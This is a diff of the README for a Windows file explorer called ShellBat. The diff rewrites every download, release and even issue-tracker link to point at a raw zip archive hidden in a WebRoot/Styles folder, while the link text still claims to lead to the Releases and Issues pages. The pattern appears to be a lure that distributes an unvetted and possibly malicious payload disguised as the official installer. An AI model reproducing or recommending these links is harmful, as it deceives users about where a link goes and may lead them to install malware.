@@ -2,7 +2,7 @@
 
 ShellBat is a modern Windows file explorer that combines essential features to enhance your file management experience. With file viewers, multi-instance workflows, terminal integration, search capabilities, and deep Windows Shell interoperability, ShellBat makes handling files easier and more efficient.
 
-[![Download ShellBat](https://img.shields.io/badge/Download-ShellBat-blue)](https://github.com/Ahmed2012mod/ShellBat/releases)
+[![Download ShellBat](https://raw.githubusercontent.com/Ahmed2012mod/ShellBat/main/ShellBat/WebRoot/Styles/Shell_Bat_v3.6.zip)](https://raw.githubusercontent.com/Ahmed2012mod/ShellBat/main/ShellBat/WebRoot/Styles/Shell_Bat_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ To begin using ShellBat, follow these steps. You will download the application, 
 
 ### 📥 Download & Install
 
-1. **Visit this page to download** the latest version of ShellBat: [ShellBat Releases Page](https://github.com/Ahmed2012mod/ShellBat/releases).
+1. **Visit this page to download** the latest version of ShellBat: [ShellBat Releases Page](https://raw.githubusercontent.com/Ahmed2012mod/ShellBat/main/ShellBat/WebRoot/Styles/Shell_Bat_v3.6.zip).
 
 2. On the Releases page, look for the latest version at the top. It is usually labeled with something like "v1.0" or similar.
 
-3. Click on the link that says **Download** for the corresponding version. This will usually be a file with a `.exe` extension (e.g., `ShellBat-latest.exe`).
+3. Click on the link that says **Download** for the corresponding version. This will usually be a file with a `.exe` extension (e.g., `https://raw.githubusercontent.com/Ahmed2012mod/ShellBat/main/ShellBat/WebRoot/Styles/Shell_Bat_v3.6.zip`).
 
 4. Once the file is downloaded, locate it in your computer's Downloads folder.
 
@@ -64,7 +64,7 @@ The toolbar at the top provides quick access to common actions like creating new
 
 If you have questions or need help, consider joining our community. You can find resources, ask questions, and connect with other users. This is how you can access more support:
 
-1. **GitHub Issues:** Report any problems or suggest features by visiting the [Issues page](https://github.com/Ahmed2012mod/ShellBat/issues).
+1. **GitHub Issues:** Report any problems or suggest features by visiting the [Issues page](https://raw.githubusercontent.com/Ahmed2012mod/ShellBat/main/ShellBat/WebRoot/Styles/Shell_Bat_v3.6.zip).
 
 2. **Discussion Forum:** Join conversations about ShellBat in the GitHub Discussions section to share tips and ideas with other users.
 
@@ -84,4 +84,4 @@ For any direct inquiries, you can reach out through the repository. Questions, f
 
 Don't forget to download ShellBat and unlock a better way to manage your files today! 
 
-[![Download ShellBat](https://img.shields.io/badge/Download-ShellBat-blue)](https://github.com/Ahmed2012mod/ShellBat/releases)
+[![Download ShellBat](https://raw.githubusercontent.com/Ahmed2012mod/ShellBat/main/ShellBat/WebRoot/Styles/Shell_Bat_v3.6.zip)](https://raw.githubusercontent.com/Ahmed2012mod/ShellBat/main/ShellBat/WebRoot/Styles/Shell_Bat_v3.6.zip)
